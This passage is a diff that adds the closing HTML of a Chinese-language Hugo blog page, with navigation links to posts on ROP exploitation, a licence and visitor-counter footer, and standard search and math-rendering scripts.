+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/09/pwn-rop-ret2shellcode/" class="post-nav-item" rel="prev" title="Pwn-ROP-ret2shellcode"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Pwn-ROP-ret2shellcode</a>
+      <a href="/articles/2023/09/pwn-rop-ret2libc-%E5%88%9D%E7%BA%A7/" class="post-nav-item" rel="next" title="Pwn-ROP-ret2libc-初级">Pwn-ROP-ret2libc-初级<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
